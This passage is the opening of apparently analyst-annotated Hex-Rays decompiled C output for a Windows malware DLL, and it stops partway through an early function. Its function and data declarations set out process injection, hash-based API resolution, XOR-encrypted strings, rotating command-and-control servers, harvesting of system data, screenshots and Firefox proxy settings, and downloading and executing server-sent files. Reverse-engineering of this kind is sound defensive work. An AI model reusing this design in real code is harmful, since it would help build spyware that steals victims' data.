/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2017 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

BOOL __cdecl bj_closehandle_sub_10001000(HANDLE hObject);
int __cdecl bj_sub_1000100E_CreateIfNotExists_FileMapping(LPCSTR lpName, int); // idb
int __cdecl bj_sub_1000107F_get_datalentoreceive(HANDLE hFileMappingObject, int); // idb
int __cdecl bj_sub_100010D6_OpenFileMapping(LPCSTR lpName, int); // idb
int __cdecl bj_sub_10001103_cpyfromview(HANDLE hFileMappingObject, int, int); // idb
int __cdecl bj_sub_10001205(HANDLE hFileMappingObject, int, int); // idb
BOOL __cdecl bj_sub_1000131E_ZwFreeVirtualMemory(HANDLE hProcess, int a2);
int __cdecl bj_sub_10001399_injectanddosth_do_sub_10001545(HANDLE hProcess, int); // idb
int __stdcall bj_sub_10001545_FillIATWithProperAddress(int a1);
HANDLE __cdecl bj_sub_10001555_dosth_do_sub_arg3(HANDLE hProcess, int modulebaseintargetprocess, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, int a5); // idb
BOOL __cdecl bj_sub_100015CD_allfree(LPVOID *a1);
char *__cdecl bj_sub_1000165C(int *a1, int a2, _DWORD *a3);
int __cdecl bj_sub_100016C8(int a1, int *a2);
int __cdecl bj_sub_100017CA(int a1, int *a2);
int __stdcall bj_sub_100018CC(LPVOID lpThreadParameter); // idb
int __stdcall bj_sub_10001A63(LPVOID lpThreadParameter); // idb
_DWORD *__cdecl bj_sub_10001C39_cpyfromview(LPVOID lpMem, HANDLE hFileMappingObject);
BOOL __cdecl bj_sub_10001D56(HINTERNET hInternet);
LPVOID __cdecl bj_sub_10001D91(unsigned int a1, int a2, SIZE_T *a3);
int __cdecl bj_sub_10001E2F(HANDLE hFileMappingObject, int, int); // idb
int __cdecl bj_sub_10001EB1_cpy2view(HANDLE hFileMappingObject, int, int); // idb
int __cdecl bj_sub_10001EE5(int a1, int *a2);
int __stdcall bj_sub_10001FE7(LPVOID lpThreadParameter); // idb
int __cdecl bj_sub_10002154_collectdata_cpy2view(HANDLE hFileMappingObject, int); // idb
int __cdecl ret_nullsub_1(_DWORD, _DWORD); // weak
int __cdecl bj_sub_100022E7_generateanciistringhash(unsigned __int8 *a1, unsigned int a2, int a3);
int __cdecl bj_sub_1000233B_generateunicodestringhash(unsigned __int16 *a1, unsigned int a2, int a3);
_BYTE *__cdecl bj_sub_10002393_big2small(_BYTE *a1);
_WORD *__cdecl bj_sub_100023AC_Big2Small(_WORD *a1);
unsigned int __cdecl bj_sub_100023C7_strlen(const char *a1);
_BYTE *__cdecl bj_sub_100023E3(const char *a1, char a2);
int __cdecl bj_sub_1000241C_atoi(char *a1);
signed int __cdecl bj_sub_10002444(int a1, int *a2, int a3);
signed int __cdecl bj_sub_1000249C(unsigned __int8 *a1, int *a2, int a3);
unsigned int __cdecl bj_sub_100024C9_findImagebase(_DWORD (__cdecl *a1)(_DWORD));
int __cdecl bj_sub_1000250C(_DWORD *a1);
int __cdecl bj_sub_10002592_findtargetprocessIDByUnicodeNameHash_itsPID_equals_ParentPID(int a1, int a2);
int *__cdecl bj_sub_10002609_finddllbasebyunicodenamehash(int a1, int a2, unsigned int a3);
unsigned int __cdecl bj_sub_10002661_getprocaddrbyasciinamehash(int a1, int a2, int a3, int a4);
int __cdecl bj_sub_10002753_findtargetprocessIDByUnicodeNameHash_findfirst_nootherrequirements(int a1, int a2);
char *__cdecl bj_sub_100027AC_GetTargetProcessName_PID_ParentPID_ByUnicodeNameHash(int a1, int a2, _DWORD *a3);
unsigned int __cdecl bj_sub_1000286A(int a1);
void *__cdecl bj_sub_100028D5(int a1);
LPVOID __cdecl bj_sub_1000295A_alloc(SIZE_T dwBytes);
signed int __cdecl bj_sub_10002971_strcmp(_DWORD *a1, char *a2, unsigned int a3);
unsigned int __cdecl bj_strcpy_sub_100029F9(unsigned int a1, _DWORD *a2, unsigned int a3);
BOOL __cdecl bj_sub_10002A8F_free(LPVOID lpMem);
LPVOID __cdecl bj_realloc_sub_10002AAD(LPVOID lpMem, SIZE_T dwBytes);
LPVOID __cdecl bj_saveinnewheap_sub_10002AE7(int a1, SIZE_T dwBytes);
signed int __cdecl bj_sub_10002B15(int a1);
signed int __cdecl bj_sub_10002C39_relocatingOperation(int a1, int a2);
int __cdecl bj_sub_10002CF7_getpreselectedprocesshandle(int a1);
_BYTE *__cdecl bj_sub_10002D18_skipspace(_BYTE *a1);
unsigned int __cdecl bj_sub_10002D28_strlen(int a1);
_BYTE *__cdecl bj_xordecrypt_sub_10002D31(_BYTE *a1, unsigned int a2, int a3, unsigned int a4);
BOOL __cdecl bj_sub_10002D6C_ZwClose(int a1);
int __cdecl bj_sub_10002DB7_gettargetprocesshandle_by_ZwOpenProcess(int nPID); // idb
DWORD __stdcall bj_sub_10002E33(LPVOID lpThreadParameter); // idb
char __cdecl bj_sub_10002E90(_DWORD *a1);
BYTE *__cdecl bj_sub_10002EDE_base64crypt(LPCSTR pszString, DWORD cchString, DWORD *pcbBinary);
CHAR *__cdecl bj_sub_10002F22_base64crypt(BYTE *pbBinary, DWORD cbBinary);
void *__cdecl bj_sub_10002F69_A2W(LPCSTR lpString);
CHAR *__cdecl bj_sub_10002FB7_unicodetomultibyte(LPCWSTR lpWideCharStr);
void *__cdecl bj_sub_10002FFB_receivingdatadecrypt(LPCSTR pszString, DWORD cchString, int a3);
_BYTE *__cdecl bj_sub_100030D1_strdecrypt(int a1, int a2);
CHAR *__cdecl bj_sub_10003123_xorencrpyt(int a1, int a2, LPVOID lpMem);
bool __cdecl bj_IsDataCorrect_sub_100031FE(__int16 a1, BYTE *a2, unsigned int a3); // idb
unsigned __int16 __cdecl bj_VerifyData_sub_10003217(BYTE *a1, unsigned int a2); // idb
int __cdecl bj_sub_10003271_cpy(int a1, _BYTE *a2, int a3);
char *__cdecl bj_sub_10003296_memset(char *a1, unsigned __int8 a2, unsigned int a3);
_BYTE *__cdecl bj_sub_100032C4_strfind(_BYTE *a1, char a2);
char *__cdecl bj_sub_100032E2_strfind(char *a1, _BYTE *a2);
_WORD *__cdecl bj_sub_10003336(_WORD *a1, __int16 a2);
char __cdecl bj_sub_1000335B_strcmp(char *a1, char *a2);
BOOL __stdcall CloseClipboard_10003399();
int __cdecl CreateProcessW_sub_10003406(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
HRESULT __stdcall CreateStreamOnHGlobal_10003491(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);
int __cdecl ExpandEnvironmentStringsW_sub_10003507(int a1, int a2, int a3);
int __cdecl GetClipboardData_1000356E(int a1);
int __cdecl IStream_Read_100035DE(int a1, int a2, int a3);
HRESULT __stdcall IStream_Reset_10003654(IStream *pstm);
int __cdecl IStream_Size_100036C4(int a1, int a2);
int __cdecl ObtainUserAgentString_sub_10003737(int a1, int a2, int a3);
int __cdecl OpenClipboard_bj_sub_100037AD(int a1);
HANDLE __cdecl keybd_event_1000381D(int a1, int a2, int a3, int a4);
_DWORD *__thiscall bj_sub_1000388A_setzero(_DWORD *this);
HANDLE __thiscall bj_sub_1000389D_free(LPVOID *this);
DWORD __stdcall NewThread_WaitAndDeleteFile(LPVOID lpThreadParameter); // idb
DWORD __thiscall bj_sub_1000390E(LPCWSTR *this, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
int __thiscall bj_sub_10003B7F(void *this);
CHAR *__thiscall bj_sub_10003B82_readtargetfile(_BYTE *this, DWORD *a2);
void __thiscall bj_sub_10003CDF(_BYTE *this);
LPCSTR __thiscall bj_sub_10003CE4(LPCSTR *this, LPCSTR lpString);
void __thiscall bj_sub_10003D02(_BYTE *this);
void *__thiscall bj_sub_10003D07(_DWORD *this, LPCSTR lpString);
void __thiscall bj_sub_10003D1E(_DWORD *this, LPCSTR lpString);
void __thiscall bj_sub_10003D76(_BYTE *this);
void __thiscall bj_sub_10003D7B(_BYTE *this);
void *__thiscall bj_sub_10003D80(void *this);
HANDLE __thiscall bj_sub_10003D8C_free(LPVOID *this);
LPVOID __thiscall bj_sub_10003D95(LPVOID *this);
DWORD __cdecl bj_sub_10003DE0_randnum(int a1, int a2);
CHAR *__thiscall bj_sub_10003DFA(_DWORD *this, int a1, int a2);
_BYTE *__thiscall bj_sub_10003E73(_DWORD *this, unsigned int a2);
DWORD bj_sub_10003EB8();
LPVOID __cdecl bj_sub_10003F04_alloc(SIZE_T dwBytes);
HANDLE __cdecl bj_sub_10003F1B_free(LPVOID lpMem);
LPVOID __cdecl bj_sub_10003F3C_alloc(SIZE_T a1);
HANDLE __cdecl bj_sub_10003F45_free(LPVOID lpMem);
_DWORD *__thiscall bj_sub_10003F4A(_DWORD *this, int a2, int a3);
_DWORD *__thiscall bj_sub_10003F7C_free(_DWORD *this, char a2);
_DWORD *__thiscall sub_10003FB5(_DWORD *this);
_DWORD *__cdecl bj_sub_10003FF9(int a1, int a2);
char __cdecl bj_sub_1000401A(int a1, _DWORD *a2);
BOOL __cdecl bj_sub_100040C0(unsigned __int16 a1, unsigned __int16 a2, WORD a3);
signed int bj_sub_10004161_x86orx64();
LPVOID bj_sub_1000418D();
CHAR *bj_sub_100041C6_get_ethernet_info();
char bj_sub_100043BE_getsystemversion();
CHAR *bj_sub_10004505_getallprocessimagename();
BYTE *bj_sub_100045AC_getdiskinfo();
DWORD bj_sub_10004627();
LPVOID __cdecl bj_sub_10004648_getscreenshot(SIZE_T *a1);
int *__thiscall bj_sub_10004758(int *this);
HANDLE __thiscall bj_sub_100047A0_freeall(void *this);
_DWORD *__thiscall bj_sub_10004829_free(_DWORD *this);
BOOL __cdecl bj_sub_1000484B_closehandle(HINTERNET *a1);
int __thiscall bj_sub_1000486B(LPCSTR *this, int a2, LPVOID lpOptional);
CHAR *__thiscall bj_sub_100049AA_pcdatacollection(void *this);
BOOL __cdecl bj_sub_10004DD9(HINTERNET hInternet, LPCSTR lpString, LPVOID lpBuffer);
void *__thiscall bj_sub_10004E16(_DWORD *this, LPCSTR lpszServerName, LPCSTR lpszObjectName, LPCSTR lpString, LPCSTR lpszVerb, int a6);
int __thiscall bj_sub_10004F6F(_DWORD *this, int a2, int a3, int a4, int a5, int a6, _DWORD *a7);
CHAR *__thiscall bj_sub_10005001_datacollect(int *this);
void *__thiscall bj_sub_100050FD_getfilefromserver(LPCSTR *this, int Buffer, int a3);
void *__thiscall bj_sub_100051C0_inject_getfilefromserver(int *this, int a2, _DWORD *a3);
char __thiscall bj_getnew_ccserver_sub_100052B7(LPVOID *this);
int __thiscall bj_sub_100053C4_getproxyserver(_DWORD *this);
char __thiscall bj_sub_100053D2(_DWORD *this);
int __thiscall bj_sub_10005414_getProxyPassword(_DWORD *this);
int __thiscall bj_sub_10005422_getproxyusername(_DWORD *this);
_DWORD *__stdcall bj_sub_10005430(_DWORD *a1);
int __thiscall bj_sub_1000553D(_BYTE *this, LPCSTR lpString, int a3);
_DWORD *__thiscall bj_sub_10005600(_DWORD *this);
_BYTE *__thiscall bj_sub_1000568E_getpredefined_ccserver(LPVOID *this);
signed int __thiscall bj_reproduce_v1_3_sub_100056AD(_DWORD *this);
char bj_sub_10005712_checkaccess2internet();
signed int __thiscall bj_sub_100057B2_changeccserverintable(LPVOID *this);
CHAR *__thiscall bj_sub_10005880_makehttpsoptionalfield(_BYTE *this, int a2, _BYTE *a3);
BYTE *__stdcall bj_sub_10005954(int a1, int a2, LPCSTR lpString, LPCSTR a4, LPCSTR a5, int a6, int a7);
int __thiscall bj_sub_10005A54_checkaccess2ccserver(void *this);
int __thiscall bj_sub_10005AE1(_DWORD *this, int a2);
HANDLE __stdcall bj_sub_10005B0A_updateccserverinfoinregistry(LPCSTR lpString);
int __thiscall bj_sub_10005BBE_postdatatoserver(int this, LPVOID lpOptional);
int __thiscall bj_sub_10005BED_internetoperation(LPCSTR *this, LPVOID lpOptional);
int __thiscall bj_sub_10005C35_inject_to_make_other_process_performing_internet_operation_and_get_result(int *this, LPVOID lpMem);
void __thiscall __noreturn bj_sub_10005D0A(LPCSTR *this);
_DWORD *__thiscall bj_sub_10006131_0a0d_to_0(_DWORD *this, int a2, unsigned int a3);
HANDLE __thiscall bj_sub_10006160(_DWORD *this);
unsigned int __cdecl bj_sub_100061AD(int a1, unsigned int a2);
int __thiscall bj_sub_100061D3_ifrequestforfile(_DWORD *this);
CHAR *__thiscall bj_sub_100061E0_newserverip(_DWORD *this);
char __thiscall bj_sub_10006238_parse_received_comandfile(LPVOID **this);
CHAR *__thiscall bj_sub_100064D9_saveandexecutefile(void **this, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
_BYTE *__thiscall bj_sub_1000653B(LPCSTR **this, LPCSTR lpString1);
CHAR *__thiscall bj_sub_10006663_readfile(_DWORD *this);
CHAR *__thiscall bj_sub_1000671E(_DWORD *this);
_DWORD *__thiscall bj_sub_10006797(_DWORD *this);
void *__thiscall bj_sub_100067AB_free(LPVOID *this);
void *__thiscall bj_sub_100067B6(LPVOID lpMem, char a2);
void *__thiscall bj_sub_100067EC_free(LPVOID *this);
char sub_1000680E();
void *__thiscall bj_sub_10006819_free(LPVOID *this, void *a2);
void *__thiscall bj_sub_10006839_free(LPVOID *this, void *a2);
void *__thiscall bj_sub_10006859_free(LPVOID *this, void *a2);
_DWORD *__thiscall bj_sub_10006879(_DWORD *this);
void *__thiscall bj_sub_1000688B(LPVOID lpMem, char a2);
char __thiscall bj_sub_100068C1_getproxyinfofromfirefoxini(LPVOID *this);
void *bj_sub_10006907_readfirefox_prefsjs();
CHAR *__stdcall bj_sub_10006C2F(char *a1);
_DWORD *__thiscall bj_sub_10006D69_setzero(_DWORD *this);
void __thiscall bj_sub_10003D76_setzero(_DWORD *this);
int __thiscall bj_sub_10006D73(_DWORD *this, int a2);
BOOL __thiscall bj_sub_10006D83_free(LPVOID *this);
void __thiscall bj_sub_10006D98(_DWORD *this, LPCSTR pszString, DWORD cchString);
char __thiscall bj_sub_10006DFB(LPTHREAD_START_ROUTINE *this, DWORD *a2);
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
BOOL secnt_1();
// int __stdcall GdipAlloc(_DWORD); weak
// int __stdcall GdipFree(_DWORD); weak
// int __stdcall GdiplusStartup(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdiplusShutdown(_DWORD); weak
// int __stdcall GdipCloneImage(_DWORD, _DWORD); weak
// int __stdcall GdipDisposeImage(_DWORD); weak
// int __stdcall GdipSaveImageToStream(int a1, int a2, int a3, int a4);
// int __stdcall GdipCreateBitmapFromHBITMAP(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipGetImageEncodersSize(int a1, int a2);
// int __stdcall GdipGetImageEncoders(_DWORD, _DWORD, _DWORD); weak
// ULONG __stdcall GetAdaptersAddresses(ULONG Family, ULONG Flags, PVOID Reserved, PIP_ADAPTER_ADDRESSES AdapterAddresses, PULONG SizePointer);
// struct hostent *__stdcall gethostbyname(const char *name);
// int __stdcall gethostname(char *name, int namelen);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __stdcall WSACleanup();
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// BOOL __stdcall CryptBinaryToStringA(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD *pcchString);
// BOOL __stdcall CryptStringToBinaryA(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// DWORD __stdcall GetPrivateProfileStringW(LPCWSTR lpAppName, LPCWSTR lpKeyName, LPCWSTR lpDefault, LPWSTR lpReturnedString, DWORD nSize, LPCWSTR lpFileName);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// BOOL __stdcall DisableThreadLibraryCalls(HMODULE hLibModule);
// int __stdcall lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
// BOOL __stdcall VerifyVersionInfoW(LPOSVERSIONINFOEXW lpVersionInformation, DWORD dwTypeMask, DWORDLONG dwlConditionMask);
// int __stdcall lstrlenW(LPCWSTR lpString);
// BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
// void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall GetVolumeInformationW(LPCWSTR lpRootPathName, LPWSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPWSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// ULONGLONG __stdcall VerSetConditionMask(ULONGLONG ConditionMask, DWORD TypeMask, BYTE Condition);
// DWORD __stdcall GetTickCount();
// void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
// BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount);
// HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// void __stdcall Sleep(DWORD dwMilliseconds);
// LPVOID __stdcall MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// HANDLE __stdcall CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// HANDLE __stdcall OpenFileMappingA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// HANDLE __stdcall CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// BOOL __stdcall GetExitCodeThread(HANDLE hThread, LPDWORD lpExitCode);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// HANDLE __stdcall GetProcessHeap();
// BOOL __stdcall IsWow64Process(HANDLE hProcess, PBOOL Wow64Process);
// DWORD __stdcall GetLastError();
// HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// int __stdcall lstrlenA(LPCSTR lpString);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall CreateDirectoryW(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall DeleteFileW(LPCWSTR lpFileName);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// void __stdcall SetLastError(DWORD dwErrCode);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// BOOL __stdcall SHGetSpecialFolderPathW(HWND hwnd, LPWSTR pszPath, int csidl, BOOL fCreate);
// int wsprintfW(LPWSTR, LPCWSTR, ...);
// BOOL __stdcall TranslateMessage(const MSG *lpMsg);
// LRESULT __stdcall DispatchMessageA(const MSG *lpMsg);
// int wsprintfA(LPSTR, LPCSTR, ...);
// int __stdcall GetSystemMetrics(int nIndex);
// BOOL __stdcall GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// BOOL __stdcall InternetSetOptionA(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
// BOOL __stdcall InternetQueryOptionA(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
// BOOL __stdcall InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
// HINTERNET __stdcall HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// BOOL __stdcall InternetCloseHandle(HINTERNET hInternet);
// HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// BOOL __stdcall HttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// BOOL __stdcall HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
// HINTERNET __stdcall InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// int __stdcall GdipSaveImageToStream(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipGetImageEncodersSize(_DWORD, _DWORD); weak
HRESULT __stdcall IStream_Read_10007238(IStream *pstm, void *pv, ULONG cb);
HRESULT __stdcall IStream_Reset_10007244(IStream *pstm);
HRESULT __stdcall IStream_Size_10007254(IStream *pstm, ULARGE_INTEGER *pui);
BOOL __stdcall OpenClipboard_10007260(HWND hWndNewOwner);
HANDLE __stdcall GetClipboardData_10007270(UINT uFormat);
HRESULT __stdcall CreateStreamOnHGlobal_10007290(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN bj_unk_1000719C; // weak
char bj_byte_100071B4[16] =
{
  'S',
  '\t',
  'Z',
  '|',
  'c',
  '\b',
  '&',
  'C',
  '\x1A',
  '3',
  '#',
  '\x1D',
  '<',
  '9',
  '\0',
  '\0'
}; // idb
_UNKNOWN bj_Kerner32_dll_100071C4; // weak
_UNKNOWN user32dll_100071D0; // weak
_UNKNOWN Shlwapidll_100071DC; // weak
_UNKNOWN ole32dll_100071E8; // weak
_UNKNOWN UrlmonDOTdll_100071F4; // weak
_UNKNOWN bj_unk_10007200; // weak
_UNKNOWN CreateProcessW_unk_1000721C; // weak
_UNKNOWN keybd_event_1000722C; // weak
_UNKNOWN unk_10007280; // weak
_UNKNOWN ObtainUserAgentString_100072A8; // weak
_UNKNOWN unk_100072C0; // weak
_UNKNOWN bj_unk_100072E8; // weak
int (__stdcall *bj_off_10007314)(char) = &bj_sub_10003F7C_free; // weak
_UNKNOWN bj_unk_10007320; // weak
_UNKNOWN ONE_10007358; // weak
_UNKNOWN bj_2_10007359; // weak
_UNKNOWN w_1000735A; // weak
_UNKNOWN c_1000735B; // weak
_UNKNOWN bj_unk_1000735C; // weak
_UNKNOWN f_10007366; // weak
_UNKNOWN l_10007367; // weak
_UNKNOWN googledotcom_10007368; // weak
char byte_100073C0[] = { '}' }; // weak
_UNKNOWN id_100074B8; // weak
_UNKNOWN disk_100074BC; // weak
_UNKNOWN build_100074C4; // weak
_UNKNOWN inject_100074CC; // weak
_UNKNOWN img_100074D4; // weak
_UNKNOWN POST_100074D8; // weak
_UNKNOWN GET_100074DC; // weak
_UNKNOWN bj_unk_100074E0; // weak
char bj_100074F0[68] =
{
  '\0',
  'f',
  '<',
  '\b',
  '\x14',
  'i',
  'T',
  '&',
  'F',
  '~',
  'J',
  '~',
  'N',
  'V',
  ' ',
  'f',
  '<',
  '\b',
  '?',
  '_',
  'O',
  '-',
  '~',
  '\\',
  'T',
  'n',
  '`',
  'z',
  '&',
  '{',
  '(',
  '\x19',
  '\r',
  '|',
  'p',
  '&',
  'h',
  '@',
  'J',
  'r',
  'R',
  'e',
  '\x1A',
  'g',
  '.',
  '\x19',
  '\x11',
  'f',
  'C',
  '7',
  ':',
  '`',
  'F',
  'i',
  'H',
  'P',
  '=',
  'n',
  ')',
  ' ',
  '0',
  'm',
  'T',
  '5',
  '\x7F',
  'A',
  'P',
  '\0'
}; // weak
_UNKNOWN Domain_10007534; // weak
_UNKNOWN wwwDOTgoogleDOTcom_1000753C; // weak
_UNKNOWN bj_unk_1000754C; // weak
_UNKNOWN bj_unk_10007568; // weak
_UNKNOWN bj_unk_1000757C; // weak
_UNKNOWN bj_unk_10007580; // weak
_UNKNOWN bj_unk_10007588; // weak
_UNKNOWN bj_10007594; // weak
_UNKNOWN bj_unk_100075A0; // weak
_UNKNOWN bj_unk_100075C0; // weak
_UNKNOWN bj_unk_100075C8; // weak
_UNKNOWN bj_unk_100075D4; // weak
_UNKNOWN bj_unk_100075DC; // weak
_UNKNOWN bj_unk_100075E4; // weak
_UNKNOWN bj_unk_100075EC; // weak
_UNKNOWN bj_unk_100075F4; // weak
_UNKNOWN bj_unk_100075FC; // weak
_UNKNOWN bj_unk_10007604; // weak
_UNKNOWN bj_unk_1000760C; // weak
_UNKNOWN bj_unk_10007618; // weak
_UNKNOWN bj_unk_1000761C; // weak
_UNKNOWN bj_unk_10007628; // weak
_UNKNOWN bj_unk_10007630; // weak
_UNKNOWN bj_unk_10007638; // weak
_UNKNOWN bj_unk_10007640; // weak
int (__thiscall *bj_off_1000765C)(LPVOID lpMem, char) = &bj_sub_100067B6; // weak
_UNKNOWN bj_unk_10007664; // weak
_UNKNOWN bj_unk_1000767C; // weak
_UNKNOWN bj_unk_10007690; // weak
int (__thiscall *bj_off_100076A4)(LPVOID lpMem, char) = &bj_sub_1000688B; // weak
const WCHAR Default = 0u; // idb
_UNKNOWN bj_unk_100076B0; // weak
_UNKNOWN unk_100076B4; // weak


//----- (10001000) --------------------------------------------------------
BOOL __cdecl bj_closehandle_sub_10001000(HANDLE hObject)
{
  return CloseHandle(hObject);
}

//----- (1000100E) --------------------------------------------------------
// __Out__ arg2: hFileMapping
int __cdecl bj_sub_1000100E_CreateIfNotExists_FileMapping(LPCSTR lpName, int a2)
{
  int v2; // esi
  HANDLE v3; // eax
  HANDLE v4; // eax
  _DWORD *v5; // eax

  v2 = 0;
  v3 = OpenFileMappingA(0xF001Fu, 0, lpName);
  *(_DWORD *)a2 = v3;
  if ( v3 )
    return 1;
  v4 = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 0x1000Cu, lpName);
  *(_DWORD *)a2 = v4;
  if ( v4 )
  {
    v5 = MapViewOfFile(v4, 0xF001Fu, 0, 0, 0);
    if ( !v5 )
    {
